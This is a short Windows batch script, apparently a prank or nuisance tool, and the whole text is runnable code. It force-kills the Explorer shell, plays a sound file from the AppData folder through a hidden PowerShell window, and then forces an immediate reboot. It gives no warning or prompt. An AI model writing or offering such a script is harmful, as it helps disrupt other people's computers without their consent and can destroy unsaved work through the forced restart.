@echo off
taskkill /f /im explorer.exe
cd %appdata%
set SOUND_FILE=sound.wav
powershell -windowstyle hidden -command "(New-Object Media.SoundPlayer \"%SOUND_FILE%\").PlaySync()"
shutdown /r /t 0
